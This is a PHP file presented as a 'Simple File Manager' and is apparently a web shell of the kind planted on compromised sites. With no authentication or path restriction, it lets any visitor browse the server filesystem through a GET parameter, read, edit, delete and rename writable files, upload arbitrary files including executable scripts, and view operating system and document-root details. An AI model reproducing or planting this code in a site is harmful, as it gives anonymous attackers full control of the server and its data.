<?php
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

// Periksa apakah direktori dapat dibaca
if (!is_dir($currentDir) || !is_readable($currentDir)) {
    echo "Error: Unable to read directory.";
    exit;
}

$dirs = scandir($currentDir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 0; }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; background-color: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        ul { padding: 0; list-style: none; }
        li { margin-bottom: 5px; }
        .action-button { margin-bottom: 20px; }
        button { margin-right: 5px; padding: 10px 15px; border: none; background-color: #007bff; color: #fff; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        .form-container { display: none; margin-bottom: 20px; }
        .form-container h3 { margin-top: 0; }
        .form-container input[type="text"], .form-container textarea { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
        .form-container button { padding: 10px 15px; background-color: #28a745; color: #fff; border: none; cursor: pointer; }
        .form-container button:hover { background-color: #218838; }
        .current-directory-container { margin-bottom: 20px; overflow-x: auto; }
        .current-directory { white-space: nowrap; display: inline-block; }
        .file-item { padding: 10px; border: 1px solid #ddd; border-radius: 4px; background-color: #fff; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .file-item a { text-decoration: none; color: #007bff; }
        .file-item a:hover { text-decoration: underline; }
        .file-actions { display: flex; }
        .file-actions button { margin-left: 5px; padding: 5px 10px; border: none; cursor: pointer; background-color: #ffc107; color: #000; }
        .file-actions button:hover { background-color: #e0a800; }
        .editable { background-color: #d4edda; border-color: #c3e6cb; }
        .non-editable { background-color: #f8d7da; border-color: #f5c6cb; }
        .popup-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
        .popup { background-color: #fff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 80%; max-width: 500px; }
        .popup-header { display: flex; justify-content: space-between; align-items: center; }
        .popup-header h3 { margin: 0; }
        .popup-close { cursor: pointer; background-color: #dc3545; color: #fff; border: none; padding: 5px 10px; border-radius: 3px; }
        .popup-close:hover { background-color: #c82333; }
    </style>
    <script>
        function toggleForm(formId) {
            var form = document.getElementById(formId);
            if (form.style.display === 'block') {
                form.style.display = 'none';
            } else {
                form.style.display = 'block';
            }
        }

        function showPopup(formId) {
            document.getElementById(formId).style.display = 'flex';
        }

        function hidePopup(formId) {
            document.getElementById(formId).style.display = 'none';
        }
    </script>
</head>
<body>

<div class="container">
    <div class="action-button">
        <button onclick="toggleForm('createFolderForm')">Create Folder</button>
        <button onclick="toggleForm('uploadFileForm')">Upload File</button>
        <button onclick="toggleForm('createFileForm')">Create File</button>
        <button onclick="showPopup('systemInfoPopup')">System Info</button>
    </div>

    <div class="form-container" id="createFolderForm">
        <h3>Create Folder</h3>
        <form action="" method="post">
            <input type="text" name="folder_name" placeholder="Folder Name" required>
            <button type="submit" name="add_folder">Add Folder</button>
        </form>
    </div>

    <div class="form-container" id="uploadFileForm">
        <h3>Upload File</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" name="add_file">Add File</button>
        </form>
    </div>

    <div class="form-container" id="createFileForm">
        <h3>Create File</h3>
        <form action="" method="post">
            <input type="text" name="file_name" placeholder="File Name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <div class="current-directory-container">
        <p class="current-directory">Current Directory: <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>">..</a> <?php echo $currentDir; ?></p>
    </div>

    <ul>
        <?php foreach ($dirs as $dir): ?>
            <?php if ($dir === '.' || $dir === '..') continue; ?>
            <?php 
            $fullPath = $currentDir . DIRECTORY_SEPARATOR . $dir; 
            $isWritable = is_writable($fullPath);
            $class = $isWritable ? 'editable' : 'non-editable';
            ?>
            <li class="file-item <?php echo $class; ?>">
                <div>
                    <?php if (is_dir($fullPath)): ?>
                        <a href="?dir=<?php echo urlencode($fullPath); ?>"><?php echo $dir; ?></a>
                    <?php else: ?>
                        <?php echo $dir; ?>
                    <?php endif; ?>
                </div>
                <div class="file-actions">
                    <?php if (!is_dir($fullPath) && $isWritable): ?>
                        <button onclick="showPopup('editPopup<?php echo urlencode($fullPath); ?>')">Edit</button>
                    <?php endif; ?>
                    <?php if ($isWritable): ?>
                        <button onclick="return confirm('Are you sure you want to delete this <?php echo is_dir($fullPath) ? 'folder' : 'file'; ?>?') && window.location.href='?delete=<?php echo urlencode($fullPath); ?>'">Delete</button>
                    <?php endif; ?>
                    <?php if ($isWritable): ?>
                        <button onclick="showPopup('renamePopup<?php echo urlencode($fullPath); ?>')">Rename</button>
                    <?php endif; ?>
                </div>
            </li>

            <?php if (!is_dir($fullPath) && $isWritable): ?>
                <div class="popup-container" id="editPopup<?php echo urlencode($fullPath); ?>">
                    <div class="popup">
                        <div class="popup-header">
                            <h3>Edit File: </h3>
                            <button class="popup-close" onclick="hidePopup('editPopup<?php echo urlencode($fullPath); ?>')">Cancel</button>
                        </div>
                        <form action="" method="post">
                            <textarea name="file_content" rows="10" cols="50"><?php echo htmlentities(file_get_contents($fullPath)); ?></textarea><br>
                            <input type="hidden" name="file_to_edit" value="<?php echo $fullPath; ?>">
                            <button type="submit" name="save_file">Save Changes</button>
                        </form>
                    </div>
                </div>
            <?php endif; ?>

            <?php if ($isWritable): ?>
                <div class="popup-container" id="renamePopup<?php echo urlencode($fullPath); ?>">
                    <div class="popup">
                        <div class="popup-header">
                            <h3>Rename File :</h3>
                            <button class="popup-close" onclick="hidePopup('renamePopup<?php echo urlencode($fullPath); ?>')">Cancel</button>
                        </div>
                        <form action="?rename=<?php echo urlencode($fullPath); ?>" method="post">
                            <input type="text" name="new_name" placeholder="New Name" required>
                            <button type="submit" name="rename">Rename</button>
                        </form>
                    </div>
                </div>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>
</div>

<div class="popup-container" id="systemInfoPopup">
    <div class="popup">
        <div class="popup-header">
            <h3>System Info</h3>
            <button class="popup-close" onclick="hidePopup('systemInfoPopup')">Close</button>
        </div>
        <div>
            <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
            <p><strong>Operating System:</strong> <?php echo php_uname(); ?></p>
            <p><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
            <p><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></p>
        </div>
    </div>
</div>

<?php
if (isset($_POST['add_folder'])) {
    $folderName = $_POST['folder_name'];
    mkdir($currentDir . DIRECTORY_SEPARATOR . $folderName);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['add_file'])) {
    $file = $_FILES['file'];
    move_uploaded_file($file['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . $file['name']);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['create_file'])) {
    $fileName = $_POST['file_name'];
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        fopen($filePath, "w");
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    } else {
        echo "File already exists.";
    }
}

if (isset($_POST['save_file'])) {
    $fileToEdit = $_POST['file_to_edit'];
    $fileContent = $_POST['file_content'];
    file_put_contents($fileToEdit, $fileContent);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['delete'])) {
    $fileToDelete = urldecode($_GET['delete']);
    if (is_dir($fileToDelete)) {
        rmdir($fileToDelete);
    } else {
        unlink($fileToDelete);
    }
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['rename'])) {
    $fileToRename = urldecode($_GET['rename']);
    if (file_exists($fileToRename)) {
        if (isset($_POST['new_name'])) {
            $newName = $_POST['new_name'];
            $newPath = dirname($fileToRename) . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($newPath)) {
                rename($fileToRename, $newPath);
                header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
                exit;
            } else {
                echo "File or folder with the same name already exists.";
            }
        }
    }
}
?>
</body>
</html>